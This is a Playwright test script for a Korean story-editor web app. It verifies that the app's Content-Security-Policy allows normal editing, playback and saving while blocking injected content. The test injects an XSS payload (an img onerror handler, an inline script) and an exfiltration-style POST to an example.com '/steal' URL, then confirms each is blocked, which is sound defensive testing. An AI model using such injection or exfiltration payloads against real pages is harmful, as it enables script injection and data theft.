const {chromium}=require(process.env.PLAYWRIGHT_MODULE||'playwright');
const assert=require('node:assert/strict'),path=require('node:path');
// The page's Content-Security-Policy: the app itself (scripts, styles, pictures, sound, fonts, saved data) runs without a
// single violation, while script that arrives inside content (an inline handler, an inline <script>) does not run and
// nothing can be sent to another host. The player page carries the same policy.
(async()=>{const browser=await chromium.launch({executablePath:process.env.CHROMIUM_PATH,headless:true,args:['--no-sandbox','--disable-dev-shm-usage']});
for(const file of ['index.html','player-index.html']){const html=require('node:fs').readFileSync(path.join(__dirname,'assets',file),'utf8');assert.match(html,/<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self' file:; /,file);assert.doesNotMatch(html.match(/Content-Security-Policy" content="([^"]*)"/)[1],/unsafe-eval|script-src[^;]*unsafe-inline|\*/,file);assert.doesNotMatch(html,/<script>|\son[a-z]+="/,file+' has no inline script');}
const p=await browser.newPage({viewport:{width:360,height:640},hasTouch:true}),errors=[];p.on('pageerror',e=>errors.push(e.message));
await p.addInitScript(()=>{window.__csp=[];document.addEventListener('securitypolicyviolation',e=>window.__csp.push(e.violatedDirective+' '+e.blockedURI));});
await p.goto(require('node:url').pathToFileURL(path.join(__dirname,'assets/index.html')).href);await p.waitForFunction(()=>!document.getElementById('openEditor').disabled);
// Ordinary use: edit, play with pictures and sound, the 구조도, a theme with its font, saving.
await p.evaluate(async()=>{await openGame(store.games.find(g=>g.draft.title==='축제 전날 밤').id);});await p.waitForFunction(()=>page==='story');
await p.evaluate(()=>{openStoryMap('picker');});await p.waitForFunction(()=>StoryMap.isOpen());await p.evaluate(()=>StoryMap.close({silent:true}));
await p.evaluate(()=>{project.theme='retro';persist();switchPage('test');});await p.waitForFunction(()=>!!run);
for(let i=0;i<5;i++){await p.evaluate(()=>{finishDialogue(true);const e=run.p.events.find(x=>x.id===run.current),c=run.ended?null:run.visibleChoices(e).find(c=>!run.blocked(c));if(c&&!run.pendingReward){run.choose(c.id);renderTest();}});await p.waitForTimeout(150);}
await p.evaluate(()=>{switchPage('story');return flushEditor();});await p.evaluate(()=>document.fonts.ready);await p.waitForTimeout(300);
assert.deepEqual(await p.evaluate(()=>window.__csp),[],'the app runs inside its policy');
// Script arriving as content does not run; other hosts are out of reach.
const r=await p.evaluate(async()=>{window.pwned=0;const d=document.createElement('div');d.innerHTML='<img src="x" onerror="window.pwned=1"><img src="https://example.com/a.png?leak=1">';document.body.append(d);const s=document.createElement('script');s.textContent='window.pwned=2';document.body.append(s);let net='';try{await fetch('https://example.com/steal',{method:'POST',body:'x'});net='sent';}catch(e){net='blocked';}await new Promise(r=>setTimeout(r,400));d.remove();return {pwned:window.pwned,net,seen:window.__csp.map(x=>x.split(' ')[0]).sort()};});
assert.equal(r.pwned,0);assert.equal(r.net,'blocked');assert.deepEqual(r.seen,['connect-src','img-src','script-src-attr','script-src-elem']);
assert.deepEqual(errors,[]);await browser.close();console.log('PASS content security policy: the app runs without violations (edit, play, 구조도, theme font, save); inline script and other hosts are blocked; the player page has it too.');
})().catch(e=>{console.error(e);process.exit(1)});
